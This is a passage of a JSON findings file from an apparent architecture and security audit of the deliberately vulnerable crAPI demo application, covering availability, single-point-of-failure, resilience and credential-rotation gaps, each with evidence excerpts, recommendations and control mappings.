        "owasp_api": [
          "API8:2023"
        ],
        "owasp": [],
        "d3fend": []
      },
      "lens_perspectives": [],
      "prerequisite_evidence": [
        "Deploy intent and corresponding RPO/RTO target",
        "Cross-store consistency requirement for backup approach"
      ]
    },
    {
      "id": "avail-b01847b0",
      "title": "Compose resource limits (cpus:0.8, memory:384M) easily exhausted by DoS",
      "goal": "availability",
      "tier": "trustworthiness",
      "severity": "medium",
      "confidence": "high",
      "disposition": "gap",
      "summary": "Tight limits + rate-limit gaps = trivial pod OOM under modest probe traffic.",
      "detail": "The default compose declares uniform tight resource limits to fit\nthe t2.micro single-host target. While appropriate for the demo\nintent, the limits are operative for any DoS / cost-of-attack\nanalysis: ~$0 of attacker resource produces a measurable identity-\nservice or workshop-service slowdown.\n\nThe threat model D-4 entry notes this is the amplifier behind D-1\n/ D-2 / D-3 — the underlying rate-limit gap converts to OOMs and\nCPU-throttles before backpressure can apply. Per the rubric this\nis medium-high; the architecture-cap concern is medium in\nisolation, escalating to high when paired with the rate-limit\ngaps.\n\nThe Helm `values.yaml` may declare different limits — not in the\ninput set.\n",
      "rubric_clause": null,
      "evidence": [
        {
          "artifact": "adrs/0001-microservice-split-by-language.md",
          "locator": "Consequences",
          "excerpt": "Resource limits are uniformly tight. cpus: 0.8, memory: 384M per service"
        }
      ],
      "recommendation": {
        "posture": "consider",
        "summary": "For non-demo deploys, raise limits to ≥1 vCPU/1 GiB; add per-service profiles in Helm."
      },
      "mappings": {
        "nist": [
          "SC-5",
          "SC-6",
          "SI-13"
        ],
        "attack": [],
        "cwe": [
          "CWE-770",
          "CWE-400"
        ],
        "owasp_api": [
          "API4:2023"
        ],
        "owasp": [],
        "d3fend": []
      },
      "lens_perspectives": [],
      "prerequisite_evidence": []
    },
    {
      "id": "avail-004444b5",
      "title": "Chatbot LLM cost amplification (denial of wallet)",
      "goal": "availability",
      "tier": "trustworthiness",
      "severity": "medium",
      "confidence": "high",
      "disposition": "gap",
      "summary": "No prompt-length cap, no per-user rate limit, no token-budget guardrail.",
      "detail": "The chatbot's chat endpoint accepts a user-supplied prompt and\nforwards it to whichever LLM provider is configured (OpenAI,\nAnthropic, Bedrock, Vertex, Groq, Mistral, Cohere, Azure). Per\nD-3 in the threat model, there is no prompt-length cap, no\nper-user rate limit, and no token-budget guardrail.\n\nEach call bills the operator's API key. Long prompts plus repeated\ncalls drain the operator's LLM budget in minutes; this is the\n\"denial of wallet\" availability variant specific to LLM-integrated\nsystems.\n\nSeverity is medium per the rubric's \"Defense-in-depth gap where a\nsingle compensating control is the only barrier\" — the only\nbarrier is operator-side LLM provider rate limiting, which is not\na crAPI control. For operators using paid-per-token providers, the\nfinancial impact can be substantial.\n",
      "rubric_clause": null,
      "evidence": [
        {
          "artifact": "threat-model.md",
          "locator": "§5 D-3",
          "excerpt": "Caller submits very long prompts that the chatbot forwards to the configured LLM provider"
        }
      ],
      "recommendation": {
        "posture": "recommended",
        "summary": "Add prompt-length cap (4K tokens), per-user 10/hr, per-user daily token budget."
      },
      "mappings": {
        "nist": [
          "SC-5",
          "SC-6",
          "AC-7"
        ],
        "attack": [],
        "cwe": [
          "CWE-770",
          "CWE-400"
        ],
        "owasp_api": [
          "API4:2023"
        ],
        "owasp": [],
        "d3fend": []
      },
      "lens_perspectives": [],
      "prerequisite_evidence": []
    },
    {
      "id": "avail-4f60016d",
      "title": "No unbounded-request-size guard documented on ingress or backend services",
      "goal": "availability",
      "tier": "trustworthiness",
      "severity": "medium",
      "confidence": "high",
      "disposition": "blocked",
      "summary": "max_request_body_size unspecified; 200 MiB POST can pin a worker on a 384 MiB pod.",
      "detail": "Per the rubric's \"Unbounded request body size\" pattern, the absence\nof a documented `max_request_body_size` is an Availability gap on\nany pod with limited memory. crAPI's compose limits (`memory: 384M`)\nmake this concrete: a single 200 MiB POST to any endpoint can pin\na worker's heap.\n\nThe OpenResty ingress has a `client_max_body_size` default\n(typically 1M), but this is not documented in the input set. The\nbackend services (Spring, Django, Go) each have their own\ndefaults, none documented.\n\nDisposition is `blocked` because the effective limits depend on\nthe actual nginx.conf.template content and per-service config not\nsurfaced in inputs. The prerequisite is the rendered template\ncontent and each service's request-size config.\n",
      "rubric_clause": null,
      "evidence": [
        {
          "artifact": "architecture-index.md",
          "locator": "§crapi-web",
          "excerpt": "Nginx config templates under services/web/ (nginx.conf.template, nginx.ssl.conf.template)"
        }
      ],
      "recommendation": {
        "posture": "recommended",
        "summary": "Set client_max_body_size=2M on OpenResty; mirror in each backend service."
      },
      "mappings": {
        "nist": [
          "SC-5",
          "SC-5(1)",
          "SI-10"
        ],
        "attack": [],
        "cwe": [
          "CWE-400",
          "CWE-770"
        ],
        "owasp_api": [
          "API4:2023"
        ],
        "owasp": [],
        "d3fend": []
      },
      "lens_perspectives": [],
      "prerequisite_evidence": [
        "nginx.conf.template content showing client_max_body_size directive",
        "Per-backend service request-size configuration"
      ]
    },
    {
      "id": "dist-1f123cef",
      "title": "Single-host topology by design — identity is a cluster-wide SPOF",
      "goal": "distributed",
      "tier": "scalability",
      "severity": "high",
      "confidence": "high",
      "disposition": "gap",
      "summary": "All services on one host per agents.md; identity service compromise/outage = total cluster auth failure.",
      "detail": "Per `agents.md` and tech_plan §10, crAPI is intentionally a\nsingle-host deploy. Every service shares the host's failure\ndomain — a host reboot, kernel panic, or compose-daemon crash\ntakes everything down simultaneously. The identity service in\nparticular is the JWT-issuer that every other service depends on\nfor verification — its compromise yields cluster-wide auth\nbypass (the threat-model framing) and its outage yields cluster-\nwide auth failure (the availability framing).\n\nThe Distributed concern is purely structural: the system is by\ndesign a single failure domain. For the demo intent (single\npractitioner, one laptop) this is appropriate. For any production-\nadjacent posture it is the first finding.\n\nSeverity is high per \"Single-AZ deployment of the authentication\nservice, session store, or payment service\" — the rubric clause\nexplicitly anchors on the auth-tier SPOF. The fact that crAPI is a\nsingle host (not just single AZ) is structurally identical for\nblast radius.\n",
      "rubric_clause": null,
      "evidence": [
        {
          "artifact": "agents.md",
          "locator": "§Intended runtime",
          "excerpt": "Default target: a single host"
        }
      ],
      "recommendation": {
        "posture": "consider",
        "summary": "For non-demo deploys, split into ≥2 AZs with identity replicated."
      },
      "mappings": {
        "nist": [
          "SC-7",
          "CP-7",
          "SC-36",
          "CP-2"
        ],
        "attack": [],
        "cwe": [
          "CWE-1188"
        ],
        "owasp_api": [
          "API4:2023"
        ],
        "owasp": [],
        "d3fend": []
      },
      "lens_perspectives": [],
      "prerequisite_evidence": []
    },
    {
      "id": "dist-04709717",
      "title": "Postgres and Mongo are single-instance with no replication topology",
      "goal": "distributed",
      "tier": "scalability",
      "severity": "high",
      "confidence": "high",
      "disposition": "gap",
      "summary": "Single-container datastores; no Mongo replSet, no Postgres streaming replication; single corrupted volume = total data loss.",
      "detail": "Per tech_plan §6, Postgres 14 and Mongo 4.4 are deployed as single\ncontainers from upstream images. There is no replication topology\ndeclared — no Postgres streaming replication, no Mongo replica\nset (Mongo 4.4 explicitly requires `--replSet` for replication;\nthe upstream image does not enable it). The Helm `values-pv.yaml`\nvariant adds persistent volumes but does not change the topology\nfrom single-instance.\n\nCombined with avail-8ad04f0e (no backups), this is a structural\ndata-loss SPOF: a single corrupted volume is unrecoverable. The\ncross-store consistency concern (intg-b097f9a8) is also tightly\ncoupled — both datastores would need coordinated replication\nstrategies and crAPI ships none.\n\nSeverity is high per the rubric's Distributed SPOF clause and per\nthe data-loss potential. For the demo intent the impact is\nbounded (operator accepts wipe-on-restart per runbook §11).\n",
      "rubric_clause": null,
      "evidence": [
        {
          "artifact": "tech_plan.md",
          "locator": "§6 Persistence and storage",
          "excerpt": "PostgreSQL 14 (postgresdb). Single database crapi"
        }
      ],
      "recommendation": {
        "posture": "consider",
        "summary": "For non-demo deploys, configure Postgres streaming replication and Mongo replSet."
      },
      "mappings": {
        "nist": [
          "SC-36",
          "CP-7",
          "CP-9",
          "SC-7"
        ],
        "attack": [],
        "cwe": [
          "CWE-1188"
        ],
        "owasp_api": [
          "API4:2023"
        ],
        "owasp": [],
        "d3fend": []
      },
      "lens_perspectives": [],
      "prerequisite_evidence": []
    },
    {
      "id": "dist-5e588812",
      "title": "Service-to-service auth via shared single JWKS — coupled failure with identity",
      "goal": "distributed",
      "tier": "scalability",
      "severity": "medium",
      "confidence": "high",
      "disposition": "gap",
      "summary": "Every service fetches JWKS from identity; identity unavailability eventually fails every verifier.",
      "detail": "Per ADR-0002, downstream services fetch JWKS from\n`IDENTITY_SERVICE=crapi-identity:8080`. Cache-time-to-live for\nthe fetched JWKS is not documented; a naive implementation\nre-fetches per-request (Spring's default is to cache, but Go and\nPython libraries vary). When identity is down, every verifier's\nJWKS cache eventually expires and authentication fails cluster-\nwide.\n\nThis is a Distributed finding because the topology choice (\"verify\nagainst live identity\") creates a coupling that makes the\nsingle-host SPOF concretely worse: not just \"identity dies and\ncan't issue new tokens\" but \"identity dies and existing tokens\nfail verification too\".\n\nSeverity is medium per the rubric's \"In-process state in the\napplication tier\" clause (the JWKS cache is the in-process state\nwhose staleness becomes a coupled failure). It escalates to high\nif the cache TTL is very short or if no cache exists.\n",
      "rubric_clause": null,
      "evidence": [
        {
          "artifact": "tech_plan.md",
          "locator": "§3 boundary #3",
          "excerpt": "Other services consume IDENTITY_SERVICE=crapi-identity:8080 to validate bearer JWTs against the JWKS endpoint"
        }
      ],
      "recommendation": {
        "posture": "recommended",
        "summary": "Document and harden per-service JWKS cache: TTL 1h, last-known-good 24h on fetch failure."
      },
      "mappings": {
        "nist": [
          "SC-7",
          "SC-22",
          "CP-13"
        ],
        "attack": [],
        "cwe": [
          "CWE-754"
        ],
        "owasp_api": [
          "API4:2023",
          "API10:2023"
        ],
        "owasp": [],
        "d3fend": []
      },
      "lens_perspectives": [],
      "prerequisite_evidence": []
    },
    {
      "id": "dist-bc4789b6",
      "title": "No network policy in shipped Helm values restricts in-cluster reachability",
      "goal": "distributed",
      "tier": "scalability",
      "severity": "medium",
      "confidence": "high",
      "disposition": "blocked",
      "summary": "Default-Kubernetes networking allows any-to-any; combined with shared creds, SSRF pivots to direct datastore access.",
      "detail": "Per `prior-audit.md` \"Operational gaps\", the shipped Helm chart\ndoes not include a NetworkPolicy. In default Kubernetes\nnetworking (no CNI policy enforcement), every pod can reach every\nother pod on every port. Combined with conf-3e324699 (plaintext\ncredentials) and the SSRF in conf-cf457739, this is the\nstructural amplifier: a compromised workshop pod can hit\nPostgres directly, bypass community to reach Mongo, hit ChromaDB\ndirectly, or pivot to identity's JWKS publishing endpoint to\nmanipulate verifier behavior.\n\nDisposition is `blocked` because the Helm values.yaml content is\nnot in the input set; the prerequisite is the rendered chart and\na determination of whether NetworkPolicy is enforced by the\ncluster's CNI.\n\nSeverity is medium because the impact is bounded by datastore\ncredential separation (which dist-c047a7c0 shows is also\nabsent). For deploys where dist-c047a7c0 is remediated and\nnetwork policy remains absent, severity escalates to high.\n",
      "rubric_clause": null,
      "evidence": [
        {
          "artifact": "prior-audit.md",
          "locator": "§Operational gaps",
          "excerpt": "No network policy in shipped Helm values"
        }
      ],
      "recommendation": {
        "posture": "required",
        "summary": "Add per-service NetworkPolicy resources to Helm chart."
      },
      "mappings": {
        "nist": [
          "SC-7",
          "SC-7(5)",
          "SC-7(21)",
          "AC-4"
        ],
        "attack": [],
        "cwe": [
          "CWE-732"
        ],
        "owasp_api": [
          "API8:2023"
        ],
        "owasp": [],
        "d3fend": []
      },
      "lens_perspectives": [],
      "prerequisite_evidence": [
        "deploy/helm/values.yaml content",
        "Cluster CNI declaration"
      ]
    },
    {
      "id": "dist-0a56c5f0",
      "title": "Heterogeneous JWT-verifier implementations across language stacks (no shared module)",
      "goal": "distributed",
      "tier": "scalability",
      "severity": "medium",
      "confidence": "high",
      "disposition": "gap",
      "summary": "Each service picks its own JWT library; verifier consistency is operator-discipline; alg-pinning drifts per challenge 15.",
      "detail": "Per ADR-0001 Consequences, every service must pick a JWT library\nin its native ecosystem and configure algorithm-pinning, `kid`\nhandling, `jku` allowlisting, and signature enforcement\nconsistently. \"There is no shared verification module.\"\n\nThe Distributed concern is the topology of trust enforcement: a\nsingle authentication tier (identity) feeds N independent\nverification surfaces (workshop, community, chatbot) where the\nenforcement quality is not pinned by architecture. Per\nchallenge 15 evidence, the consistency does not in fact hold —\nthe four documented JWT forgery patterns each succeed against\none or more verifiers and not necessarily all.\n\nSeverity is medium per the rubric's \"In-process state in the\napplication tier preventing horizontal scale\" pattern as adapted\nto verifier consistency: the state here is not memory but\nconfiguration drift. The Integrity team writes the\nverifier-quality finding (intg-15c04a1c); this finding holds\nthe topology-of-verification concern.\n",
      "rubric_clause": null,
      "evidence": [
        {
          "artifact": "adrs/0001-microservice-split-by-language.md",
          "locator": "Consequences",
          "excerpt": "JWT verification surface is heterogeneous. Every service has to pick a JWT library. There is no shared verification module"
        }
      ],
      "recommendation": {
        "posture": "recommended",
        "summary": "Adopt a verifier-validation matrix in CI: single test suite hits every service's verifier with same forgery samples."
      },
      "mappings": {
        "nist": [
          "IA-2",
          "IA-5(2)",
          "SC-23",
          "CM-2"
        ],
        "attack": [],
        "cwe": [
          "CWE-345",
          "CWE-347"
        ],
        "owasp_api": [
          "API2:2023",
          "API8:2023"
        ],
        "owasp": [],
        "d3fend": []
      },
      "lens_perspectives": [],
      "prerequisite_evidence": []
    },
    {
      "id": "dist-c5b2799b",
      "title": "Mailhog is single instance with in-memory storage — OTP delivery is SPOF",
      "goal": "distributed",
      "tier": "scalability",
      "severity": "medium",
      "confidence": "high",
      "disposition": "gap",
      "summary": "Container restart drops every captured OTP; no production SMTP path.",
      "detail": "Per architecture-index `§mailhog`, captured emails live in an\nin-memory ring buffer. A container restart loses every captured\nOTP, password-reset email, and email-change notification.\nCombined with the lack of any production SMTP path (ADR-0003), a\nrestart of the mailhog container during user activity strands\nthe user mid-flow with no way to recover the in-flight OTP.\n\nThe Distributed concern is the topology choice: mailhog is the\nOTP delivery system and it has no persistence. For the demo\nintent this is appropriate (restart-during-class is rare). For\nany deploy where users rely on async OTP delivery, the\nstateless mailhog is a structural SPOF.\n\nSeverity is medium because the demo-intent posture makes this\ntolerable; it escalates if any deploy treats mailhog as a\nproduction-grade OTP path.\n",
      "rubric_clause": null,
      "evidence": [
        {
          "artifact": "architecture-index.md",
          "locator": "§mailhog Datastores touched",
          "excerpt": "In-memory ring buffer"
        }
      ],
      "recommendation": {
        "posture": "consider",
        "summary": "For non-demo deploys, swap Mailhog for real SMTP relay."
      },
      "mappings": {
        "nist": [
          "CP-7",
          "SI-13",
          "SC-36"
        ],
        "attack": [],
        "cwe": [
          "CWE-1188"
        ],
        "owasp_api": [
          "API4:2023"
        ],
        "owasp": [],
        "d3fend": []
      },
      "lens_perspectives": [],
      "prerequisite_evidence": []
    },
    {
      "id": "resil-c7975476",
      "title": "No circuit breaker on outbound calls — three integration points unprotected",
      "goal": "resilient",
      "tier": "scalability",
      "severity": "high",
      "confidence": "high",
      "disposition": "gap",
      "summary": "identity→gateway, workshop→mechanic, chatbot→LLM all lack documented circuit breakers; vendor degradation cascades.",
      "detail": "The Resilient lens on the outbound integration topology:\n\n- identity → gateway-service: VIN owner lookup and payment dispatch.\n  No circuit breaker documented.\n- workshop → user-supplied mechanic_api: the SSRF surface; per\n  avail-6af5aff7 no rate limit either, but separately no\n  circuit breaker on per-target failure state.\n- chatbot → external LLM provider: per architecture-index, the\n  chatbot calls OpenAI/Anthropic/Bedrock/etc. over the public\n  internet. No circuit breaker on provider failures.\n\nPer the rubric's \"No circuit breaker on outbound calls to\nthird-party APIs\" pattern, this is a high-severity Resilient\nfinding: when the gateway is slow, identity's request-handler pool\nsaturates (no circuit-break → no fail-fast). When the LLM provider\nis degraded, chatbot calls hang. The failure cascades because\nthe caller has no mechanism to mark the target as failing and\nreject quickly.\n\nThis finding sits alongside avail-fb795bfb (no timeout) — the\ntimeout fix bounds the per-call cost; the circuit-breaker fix\nbounds the aggregate cost across a window. Both are required.\n",
      "rubric_clause": null,
      "evidence": [
        {
          "artifact": "tech_plan.md",
          "locator": "§3 boundary #5",
          "excerpt": "identity → gateway-service. Outbound HTTPS"
        }
      ],
      "recommendation": {
        "posture": "required",
        "summary": "Add per-target circuit breakers with failure-rate threshold (50%, 5s window) on every outbound integration."
      },
      "mappings": {
        "nist": [
          "SI-13",
          "SC-5",
          "CP-13",
          "SI-17"
        ],
        "attack": [],
        "cwe": [
          "CWE-405",
          "CWE-754"
        ],
        "owasp_api": [
          "API4:2023",
          "API10:2023"
        ],
        "owasp": [],
        "d3fend": []
      },
      "lens_perspectives": [],
      "prerequisite_evidence": []
    },
    {
      "id": "resil-776fc650",
      "title": "No refresh-token rotation, no refresh-token reuse detection — 7-day session theft has no recovery signal",
      "goal": "resilient",
      "tier": "scalability",
      "severity": "high",
      "confidence": "high",
      "disposition": "gap",
      "summary": "7-day bearer-token TTL with no revocation; stolen token persists full lifetime with no detection signal.",
      "detail": "Per tech_plan §4, JWTs are 7-day TTL bearer tokens with no\nrefresh-token rotation, no JTI deny-list, no introspection\nchannel. Per R-2 in the threat model, after an account takeover\nvia JWT forgery (intg-15c04a1c) or OTP brute-force\n(avail-e96ad7ff), the attacker's token persists for the full\n7-day window even after the legitimate owner resets their\npassword or remediates.\n\nThe Resilient framing is recovery-signal: a robust auth design\nconverts credential theft into a detection event via\nrefresh-token reuse detection (the OAuth2.1 standard). crAPI's\nabsence of refresh tokens means there is no rotation, no reuse,\nand therefore no detection signal. The runbook §10 explicitly\nstates \"Cannot invalidate the attacker's session\" — the absence\nof a recovery mechanism is documented.\n\nSeverity is high per the rubric's \"No detection of refresh-token\nreuse\" clause — even more sharply, the underlying refresh-token\nmechanism is absent entirely so the rubric's premise is missing.\n",
      "rubric_clause": null,
      "evidence": [
        {
          "artifact": "runbook.md",
          "locator": "§10 Respond to user account takeover",
          "excerpt": "Cannot invalidate the attacker's session. No JTI revocation list"
        }
      ],
      "recommendation": {
        "posture": "required",
        "summary": "Short-lived (1h) access + rotating refresh + reuse-detection + JTI deny-list."
      },
      "mappings": {
        "nist": [
          "IA-5",
          "IA-5(13)",
          "AC-12",
          "SI-4",
          "SI-17"
        ],
        "attack": [
          "T1550"
        ],
        "cwe": [
          "CWE-613",
          "CWE-384"
        ],
        "owasp_api": [
          "API2:2023"
        ],
        "owasp": [],
        "d3fend": []
      },
      "lens_perspectives": [],
      "prerequisite_evidence": [],
      "headline": true,
      "headline_rank": 10
    },
    {
      "id": "resil-5738d03e",
      "title": "No graceful degradation for identity outage — total auth failure across cluster",
      "goal": "resilient",
      "tier": "scalability",
      "severity": "medium",
      "confidence": "high",
      "disposition": "gap",
      "summary": "Identity unavailability collapses entire deploy; no documented degraded-mode.",
      "detail": "When identity is unavailable: (a) no new logins (no JWT issuance);\n(b) verifier JWKS caches expire (per dist-5e588812) and\nverifiers fail; (c) any flow that depends on identity\nverification — every workshop call, every community call, every\nchatbot call — degrades to 5xx.\n\nThere is no documented degraded-mode for any service. The\nrunbook §10 covers user-account incident response but not\nidentity-service outage response. The rubric's \"No graceful\ndegradation specified for identity-provider outage\" clause\nmaps directly.\n\nSeverity is medium per the rubric for the demo intent (no\nenterprise reliance, no SLO commitment per avail-470902f0);\nescalates to critical per the rubric clause for any deploy that\ntreats crAPI as a production identity tier.\n",
      "rubric_clause": null,
      "evidence": [
        {
          "artifact": "tech_plan.md",
          "locator": "§3 boundary #3",
          "excerpt": "identity ↔ peers. Other services consume IDENTITY_SERVICE"
        }
      ],
      "recommendation": {
        "posture": "consider",
        "summary": "Document degraded-mode: verifiers retain last-known-good JWKS for 24h on identity outage."
      },
      "mappings": {
        "nist": [
          "CP-12",
          "CP-13",
          "IA-2",
          "SI-17"
        ],
        "attack": [],
        "cwe": [
          "CWE-754"
        ],
        "owasp_api": [
          "API4:2023"
        ],
        "owasp": [],
        "d3fend": []
      },
      "lens_perspectives": [],
      "prerequisite_evidence": []
    },
    {
      "id": "resil-9e865b2e",
      "title": "No bulkhead between consumer-facing API paths and admin / contact_mechanic outbound paths",
      "goal": "resilient",
      "tier": "scalability",
      "severity": "medium",
      "confidence": "high",
      "disposition": "gap",
      "summary": "All workshop endpoints share one thread pool; admin enumeration or contact_mechanic burst starves customer traffic.",
      "detail": "The workshop service hosts:\n- Customer-facing paths: /shop/products, /shop/orders, /shop/orders/{id}\n- Admin enumeration paths: /shop/orders/all, /management/users/all\n- Outbound-fetch paths: /merchant/contact_mechanic\n\nAll share a single thread/worker pool. An admin call to\n`/shop/orders/all` that pulls a large result set, or a malicious\nburst against `/contact_mechanic` (avail-6af5aff7), starves the\ncustomer-facing /shop/orders endpoint of workers. The pattern\ngeneralizes: any high-cost path in the same pool degrades every\nother path.\n\nPer the rubric's \"No bulkhead between consumer-facing API paths\nand administrative or batch paths\" — severity is high there\nbecause it cites CDE-scope batch jobs. Here severity is medium\nbecause the batch surface is not CDE-bearing, but the customer-\nstarvation pattern is the same.\n",
      "rubric_clause": null,
      "evidence": [
        {
          "artifact": "tech_plan.md",
          "locator": "§8 Workshop surface",
          "excerpt": "GET /workshop/api/shop/orders/all <-- admin-shaped enumeration. POST /workshop/api/merchant/contact_mechanic <-- SSRF webhook, no rate limit"
        }
      ],
      "recommendation": {
        "posture": "recommended",
        "summary": "Move /contact_mechanic and admin paths to separate worker pool or deployment."
      },
      "mappings": {
        "nist": [
          "SC-5",
          "SC-6",
          "SI-13"
        ],
        "attack": [],
        "cwe": [
          "CWE-400",
          "CWE-770"
        ],
        "owasp_api": [
          "API4:2023"
        ],
        "owasp": [],
        "d3fend": []
      },
      "lens_perspectives": [],
      "prerequisite_evidence": []
    },
    {
      "id": "resil-01a11294",
      "title": "Retry policy unspecified — no backoff, jitter, budget, idempotency-key interaction",
      "goal": "resilient",
      "tier": "scalability",
      "severity": "medium",
      "confidence": "medium",
      "disposition": "blocked",
      "summary": "Three outbound paths have no documented retry posture; thundering-herd risk.",
      "detail": "Per the rubric's \"Retry policy without jitter on the event-bus\nconsumer or webhook delivery\" pattern, retry posture is an\nResilient finding when it is documented but inadequate, or\nunspecified when the policy should exist. crAPI's three outbound\npaths have no retry-policy documentation in inputs.\n\nThe interaction with idempotency (intg-ab3edc7a) is also\nload-bearing: retries without idempotency keys produce duplicate\nside effects. Per the rubric clause this is the relevant\ncoupling.\n\nDisposition is `blocked` because the actual retry behavior in\neach service is library-default — Spring's `RestTemplate` does\nnot retry; Python `requests` does not retry; Go `http.Client`\ndoes not retry — so the structural concern is \"no retries at all\"\nrather than \"retries without discipline\". This is itself a\nResilient finding (no resilience on transient failure) but\nrequires source confirmation; flagging blocked rather than\nasserting absence.\n",
      "rubric_clause": null,
      "evidence": [
        {
          "artifact": "tech_plan.md",
          "locator": "§3 boundary #5",
          "excerpt": "identity → gateway-service"
        }
      ],
      "recommendation": {
        "posture": "recommended",
        "summary": "Document retry policy: 3 retries, exponential backoff with jitter, idempotency keys."
      },
      "mappings": {
        "nist": [
          "SI-13",
          "SI-13(4)",
          "SC-5(1)"
        ],
        "attack": [],
        "cwe": [
          "CWE-754",
          "CWE-755"
        ],
        "owasp_api": [
          "API4:2023",
          "API10:2023"
        ],
        "owasp": [],
        "d3fend": []
      },
      "lens_perspectives": [],
      "prerequisite_evidence": [
        "Per-service outbound HTTP client wrapper code",
        "Idempotency-key handling on each outbound path"
      ]
    },
    {
      "id": "resil-373918f9",
      "title": "No graceful degradation specified for vendor outage (gateway or LLM)",
      "goal": "resilient",
      "tier": "scalability",
      "severity": "medium",
      "confidence": "high",
      "disposition": "gap",
      "summary": "Vendor 5xx cascades to user-facing 500; no cached fallback or multi-provider switching.",
      "detail": "Per the rubric's \"Third-party API failure cascades to user-facing\n5xx response\" pattern, the absence of a graceful-degradation\nstrategy converts every vendor incident into a crAPI incident.\n\nTwo specific outbound paths:\n- identity → gateway-service: when gateway returns 5xx, VIN\n  lookups and payment dispatch fail with no cached fallback.\n- chatbot → LLM provider: when the configured provider is\n  rate-limiting or down, chatbot calls return 5xx with no\n  provider-fallback (the architecture supports multiple\n  providers — selection per-call would be the natural\n  degradation path).\n\nSeverity is medium per the rubric's \"Third-party API failure\ncascades\" clause; the user-impact is bounded by how often the\nvendor is degraded.\n",
      "rubric_clause": null,
      "evidence": [
        {
          "artifact": "tech_plan.md",
          "locator": "§3 boundary #5",
          "excerpt": "identity → gateway-service. Outbound HTTPS"
        }
      ],
      "recommendation": {
        "posture": "recommended",
        "summary": "Cached-fallback for gateway VIN lookups; multi-provider fallback for LLM."
      },
      "mappings": {
        "nist": [
          "CP-12",
          "CP-13",
          "SI-17",
          "SC-5"
        ],
        "attack": [],
        "cwe": [
          "CWE-1188"
        ],
        "owasp_api": [
          "API10:2023"
        ],
        "owasp": [],
        "d3fend": []
      },
      "lens_perspectives": [],
      "prerequisite_evidence": []
    },
    {
      "id": "resil-592113d0",
      "title": "No chaos-engineering or game-day evidence; runbook lacks failure-mode catalog",
      "goal": "resilient",
      "tier": "scalability",
      "severity": "medium",
      "confidence": "high",
      "disposition": "blocked",
      "summary": "Operational maturity for Resilient capabilities requires chaos/game-day evidence; demo intent makes this blocked.",
      "detail": "Per the rubric's evidence ladder, `tested` and `operationalized`\nmaturity for Resilient capabilities requires chaos-engineering\nor game-day evidence. crAPI's runbook covers only basic startup,\nhealth checks, and known-incident response (a balance-went-wrong\nreport; an account-takeover report). There is no failure-mode\ncatalog (\"what fails when X is down\"), no documented\ndegraded-mode triggers, no game-day cadence.\n\nThis is `blocked` because the underlying intent (demo-only) makes\nchaos-engineering inapplicable per agents.md. The prerequisite\nfor declaring resilience capabilities is a deploy intent that\nwarrants the investment.\n\nSeverity is medium because for the demo intent the absence is\ncorrect; for any other intent it is the missing operational\nfoundation under everything else in this tier.\n",
      "rubric_clause": null,
      "evidence": [
        {
          "artifact": "runbook.md",
          "locator": "§12 Troubleshooting reference",
          "excerpt": "For in-depth issues, the operator is referred to the upstream GitHub Issues; no internal escalation path is defined"
        }
      ],
      "recommendation": {
        "posture": "consider",
        "summary": "For non-demo deploys, add failure-mode catalog; quarterly game-days for production-contemplated."
      },
      "mappings": {
        "nist": [
          "CP-2",
          "CP-2(5)",
          "SI-13"
        ],
        "attack": [],
        "cwe": [],
        "owasp_api": [],
        "owasp": [],
        "d3fend": []
      },
      "lens_perspectives": [],
      "prerequisite_evidence": [
        "Deploy intent declaration",
        "Failure-mode catalog",
        "Game-day or chaos-engineering exercise records"
      ]
    },
    {
      "id": "ephem-30d38360",
      "title": "JWT signing key has no rotation procedure (jwks.json effectively static)",
      "goal": "ephemeral",
      "tier": "scalability",
      "severity": "high",
      "confidence": "high",
      "disposition": "gap",
      "summary": "Runbook §5 GAP; ADR-0002 confirms no rotation tooling; key has indefinite lifetime.",
      "detail": "Per runbook §5 and ADR-0002 \"No rotation tooling\", crAPI ships no\nmechanism to rotate the JWT signing key. The `jwks.json` mounted\ninto the identity container is whatever was there at deploy time;\nreplacing it requires manual file mutation plus container\nrestart, plus an unanswered cutover decision about\nalready-issued tokens.\n\nTwo Ephemeral concerns: (a) the key itself is long-lived — for a\nmulti-week or multi-month deploy the signing key has effectively\nindefinite lifetime; (b) the absence of rotation tooling means\nthat even when rotation is desired (e.g., post-incident, on\npersonnel change, on suspected leak) the operator has no\npublished path. Runbook §5 enumerates the multi-step manual\nceremony.\n\nSeverity is high per the rubric's \"Service account tokens or API\nkeys are static long-lived secrets in application configuration\nwith no rotation\" — substitute \"JWT signing key\" for \"API key\"\nand the structural pattern is identical. The key is the\nauthentication trust anchor for the cluster.\n",
      "rubric_clause": null,
      "evidence": [
        {
          "artifact": "runbook.md",
          "locator": "§5 Rotate the JWT signing key",
          "excerpt": "GAP. No documented procedure ships in the input set"
        },
        {
          "artifact": "adrs/0002-jwt-with-rsa-and-jwks.md",
          "locator": "Consequences",
          "excerpt": "No rotation tooling"
        }
      ],
      "recommendation": {
        "posture": "required",
        "summary": "Ship rotate-jwks.sh with multi-kid grace window; document cutover policy."
      },
      "mappings": {
        "nist": [
          "IA-5",
          "IA-5(1)",
          "IA-5(7)",
          "SC-12",
          "SC-12(1)",
          "AC-2"
        ],
        "attack": [
          "T1552"
        ],
        "cwe": [
          "CWE-321",
          "CWE-798"
        ],
        "owasp_api": [
          "API2:2023",
          "API8:2023"
        ],
        "owasp": [],
        "d3fend": []
      },
      "lens_perspectives": [],
      "prerequisite_evidence": []
    },
    {
      "id": "ephem-22c2358c",
      "title": "Datastore admin credentials static — multi-service simultaneous restart required to rotate",
      "goal": "ephemeral",
      "tier": "scalability",
      "severity": "high",
      "confidence": "high",
      "disposition": "gap",
      "summary": "Runbook §6 GAP; rotation requires all consuming services restart simultaneously.",
      "detail": "The rotation procedure for `admin / crapisecretpassword` is\nexplicitly GAP per runbook §6. The procedure requires (a)\nALTER USER / db.changeUserPassword in each datastore, (b)\nupdating env vars in every consuming service, (c) restarting\nevery consuming service simultaneously to avoid a window of\nbroken connectivity.\n\nThe \"simultaneously restart everything\" requirement is the\nEphemeral concern: the credential cannot be rotated without\ncluster downtime. This makes rotation effectively never-\nperformed in practice. Combined with conf-3e324699 (the\ncredential is plaintext in compose), this is a long-lived\nshared credential with documented hostile-rotation cost.\n\nSeverity is high per the rubric's \"Service account tokens or\nAPI keys are static long-lived secrets\" — the datastore admin\ncredential here functions identically.\n",
      "rubric_clause": null,
      "evidence": [
        {
          "artifact": "runbook.md",
          "locator": "§6 Rotate datastore credentials",
          "excerpt": "GAP. The Postgres and Mongo passwords (crapisecretpassword) are hardcoded"
        }
      ],
      "recommendation": {
        "posture": "required",
        "summary": "Per-service credentials via init container; rotate independently via secret store."
      },
      "mappings": {
        "nist": [
          "IA-5",
          "IA-5(1)",
          "IA-5(7)",
          "AC-2",
          "SC-12"
